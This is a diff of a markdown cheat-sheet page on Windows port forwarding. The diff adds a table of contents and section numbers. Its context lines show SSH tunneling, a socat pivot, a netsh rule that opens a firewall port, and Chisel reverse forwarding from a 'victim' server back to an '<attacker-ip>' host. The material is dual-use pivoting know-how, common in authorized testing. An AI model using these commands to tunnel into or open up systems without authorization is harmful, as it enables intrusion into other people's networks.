@@ -2,10 +2,18 @@
 title: Windows port forwarding
 ---
 
-## Port forwarding via SSH
+- [1. Port forwarding via SSH](#1-port-forwarding-via-ssh)
+  - [1.1. Remote port forwarding](#11-remote-port-forwarding)
+  - [1.2. Local port forwarding](#12-local-port-forwarding)
+- [2. Port forwarding with Socat](#2-port-forwarding-with-socat)
+- [3. Chisel tool](#3-chisel-tool)
+  - [3.1. Reverse port-forwarding](#31-reverse-port-forwarding)
+  - [3.2. Reverse port-forwarding using SOCKS proxy](#32-reverse-port-forwarding-using-socks-proxy)
+
+## 1. Port forwarding via SSH
 SSH can be used to perform tunneling. Nowadays Windows is distrubuted with the OpenSSH client included by default.
 
-### Remote port forwarding
+### 1.1. Remote port forwarding
 
 ```plaintext
    IP1                  IP2 (pivot)           IP3
@@ -20,7 +28,7 @@ ssh <user1>@<ip1> -R <port1>:<ip3>:<port3> -N
 
 Now the `ip3:port3` is available from ip1 on `user1@localhost:port1`. Port numbers don't need to match. Local port `localhost:9999` can be forwarded to the remote RDP `1.1.1.1:3389` service.
 
-### Local port forwarding
+### 1.2. Local port forwarding
 
 ```plaintext
    IP1                 IP2 (pivot)            IP3
@@ -36,11 +44,11 @@ ssh <user1>@<ip1> -L *:<port1>:127.0.0.1:<port2>
 
 Now the `ip1:port1` is available from `ip3` via `ip2:port2`. In other words, `ip2:port2` points to `ip1:port1`.
 
-## Port forwarding with Socat
+## 2. Port forwarding with Socat
 Socat allows to forward ports in a simpler way than SSH but it have to be transfered to the pivot host.
 
 ```plaintext
-   IP1                 IP2 (pivot)            IP3
+   IP1              IP2 (pivot)               IP3
 |'''''''|            |'''''''|             |'''''''|
 |,,,,,,,| ---------> | port2 | ----------> | port3 | 
                      |  SSH  |             |,,,,,,,|
@@ -59,10 +67,10 @@ Now the `ip3:port3` is available via `ip2:port2`. To open the pivot's port:
 netsh advfirewall firewall add rule name="Open Port <port2>" dir=in action=allow protocol=TCP localport=<port2>
 ```
 
-## Chisel tool
+## 3. Chisel tool
 [Chisel](https://github.com/jpillora/chisel) is a swiss-knife tool (Linux and Windows) for any kind of a port forwarding.
 
-### Reverse port-forwarding
+### 3.1. Reverse port-forwarding
 It makes connection from the server to the attacker host.
 
 ```bash
@@ -75,7 +83,7 @@ chisel client <attacker-ip>:9001 R:<open-port>:127.0.0.1:<local-port>
 # 3. Now open in browser: http://localhost:<open-port>
 ```
 
-### Reverse port-forwarding using SOCKS proxy
+### 3.2. Reverse port-forwarding using SOCKS proxy
 It is useful if we want to access many ports on the victim's machine.
 
 ```bash
